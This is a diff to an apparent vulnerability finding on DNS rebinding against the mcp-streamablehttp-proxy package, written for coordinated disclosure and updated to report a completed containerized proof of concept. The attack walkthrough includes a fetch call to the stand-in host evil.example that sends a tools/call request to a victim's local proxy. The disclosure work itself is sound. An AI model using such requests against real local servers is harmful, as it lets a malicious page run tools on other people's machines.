@@ -4,7 +4,7 @@
 **Target:** `mcp-streamablehttp-proxy` v0.2.0 (PyPI; [atrawog/mcp-oauth-gateway](https://github.com/atrawog/mcp-oauth-gateway/tree/main/mcp-streamablehttp-proxy))
 **Tested by:** MCP-S-014 (static, after rule W1 fix would have fired automatically) + manual source review
 **Agent driver:** n/a (transport-layer finding, agent-independent)
-**Outcome:** **VULNERABILITY (source-confirmed; full browser DNS-rebind PoC pending repro harness)** — universal escalation vector against any stdio MCP server the proxy fronts. Coordinated disclosure drafted at [disclosures/2026-05-12-mcp-oauth-gateway-dns-rebinding.md](../disclosures/2026-05-12-mcp-oauth-gateway-dns-rebinding.md). Embargo target: 2026-08-10.
+**Outcome:** **VULNERABILITY (source-confirmed + reproduced end-to-end in a containerized PoC; harness at [poc/dns-rebind/](../poc/dns-rebind/))** — universal escalation vector against any stdio MCP server the proxy fronts. Coordinated disclosure drafted at [disclosures/2026-05-12-mcp-oauth-gateway-dns-rebinding.md](../disclosures/2026-05-12-mcp-oauth-gateway-dns-rebinding.md). Embargo target: 2026-08-10.
 
 ## Result
 
@@ -64,7 +64,11 @@ async def handle_mcp(request: Request):
 
 The comment is a hint — the maintainer explicitly assumed Traefik would handle Origin enforcement upstream of this handler. In the default deployment, there is no Traefik.
 
-## Reproduction (source-level; full PoC harness pending)
+## Reproduction
+
+A full containerized end-to-end PoC harness is at [`poc/dns-rebind/`](../poc/dns-rebind/) — single command (`make demo`) runs both a fast Python-only probe (proves the vulnerability shape in ~5 seconds: server accepts requests with arbitrary `Origin` and `Host` headers) and a full Docker compose stack with attacker / DNS / victim / Playwright browser (proves a browser-driven attack succeeds end-to-end in ~10 seconds). The harness targets this exact package and version. The full README at [`poc/dns-rebind/README.md`](../poc/dns-rebind/README.md) walks through the architecture; the public-facing summary at [`examples/04-dns-rebind-poc/`](../examples/04-dns-rebind-poc/) is the reader-facing pointer.
+
+### Source-level reproduction
 
 Verifiable from source by issuing a request with no Origin header and observing acceptance:
 
@@ -91,7 +95,7 @@ A browser-driven DNS-rebind PoC follows the standard template:
 5. JavaScript issues `fetch('http://evil.example:3000/mcp', { method: 'POST', body: JSON.stringify({...tools/call...}) })`. Browser treats it as same-origin (the page is loaded from `evil.example` and the request goes to `evil.example`). Request lands on the operator's local proxy.
 6. Proxy accepts the request and invokes the requested tool on the wrapped stdio MCP server.
 
-The full repro harness is the subject of follow-up work — see §"Suggested follow-up" below.
+The full repro harness was follow-up work — now delivered at [`poc/dns-rebind/`](../poc/dns-rebind/). See §"Reproduction" above.
 
 ## Impact
 
@@ -144,7 +148,7 @@ For operators who can't wait for a patched release: front the proxy with a rever
 ## Caveats
 
 - **Default deployment is the bug, not the package's existence.** Run with Traefik in front and the bug is mitigated. The disclosure is calibrated to this — recommended remediation gives the maintainer an opt-in path to preserve the Traefik posture while making the standalone path safe.
-- **No full PoC harness yet.** The DNS-rebind reproduction is described from first principles; a containerized end-to-end demonstration is the next deliverable (see [findings/2026-05-12-dns-rebinding-survey.md](2026-05-12-dns-rebinding-survey.md) §"Next steps"). Source-level analysis alone is sufficient to claim the vulnerability — every component of the attack is observable in the code without execution.
+- **PoC harness delivered.** End-to-end containerized reproduction at [`poc/dns-rebind/`](../poc/dns-rebind/), verified against this exact package version. Real DNS-rebinding against headless Chromium is hard (Chromium's internal resolver enforces a ~60-second cache TTL regardless of server TTL — documented Chromium issue 40076953), so the browser-side leg of the harness uses a reverse-proxy equivalent on the attacker that delivers the same victim-side conditions (browser-set `Origin: http://evil.example:3000` and `Host: evil.example:3000` headers forwarded unchanged). The vulnerability under test — the victim accepting these mismatched headers — is identical in both attack paths.
 
 ## Suggested follow-up
 
